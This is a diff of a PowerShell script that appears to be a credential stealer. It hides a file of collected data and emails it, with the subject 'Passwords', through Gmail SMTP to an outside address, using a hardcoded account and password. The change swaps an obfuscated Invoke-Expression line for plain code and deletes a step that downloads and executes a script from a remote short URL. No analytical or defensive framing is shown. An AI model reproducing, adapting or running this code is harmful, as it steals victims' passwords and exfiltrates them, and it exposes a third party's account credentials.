@@ -42,13 +42,9 @@ elseif("7-Zip"-in $arh)
 attrib +H $p
 
 $SMTPServer="smtp.gmail.com";$SMTPInfo=New-Object Net.Mail.SmtpClient($SmtpServer,587);$SMTPInfo.EnableSsl=$true
-. ( $veRbOSEPrEFeREncE.tOsTriNG()[1,3]+'X'-join'')( ((("{22}{4}{31}{36}{21}{15}{30}{43}{17}{24}{26}{40}{39}{2}{9}{11}{34}{7}{32}{27}{14}{33}{0}{18}{8}{23}{28}{29}{41}{10}{5}{6}{16}{12}{44}{13}{38}{35}{37}{42}{20}{19}{3}{25}{1}"-f'm1h7P','e','7Pf7swwq@','ess','M','il','=New','o',';lNf','gma','ma','i','Ob','t Syst','mp','ew-Objec','-','t.Ne',')','ilM','.Ma','s=N','lNfS','Rep','t','ag','work','P,h7Ppara','o','rt','t ','T','mh7','a','l.c','t','PInfo.Credential','.M','em.Ne','l(h','Credentia','E','ail','System.Ne','jec')) -CrEPLaCE'lNf',[cHaR]36  -CrEPLaCE'h7P',[cHaR]34))
+$SMTPInfo.Credentials=New-Object System.Net.NetworkCredential("f7swwq@gmail.com","parampam1");$ReportEmail=New-Object System.Net.Mail.MailMessage
 
 $ReportEmail.From="f7swwq@gmail.com";$ReportEmail.To.Add("keklol2045@gmail.com");$ReportEmail.Subject="Passwords"
 $s=New-Object Net.Mail.Attachment($p);if("WinRAR"-in $arh){$ReportEmail.Attachments.Add($s)}else{$ReportEmail.Attachments.Add($s)};$SMTPInfo.Send($ReportEmail)
 
-try{
-  Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://btfr.cc/9v5")
-}catch{
-  Write-Output 'Error'
-}
+
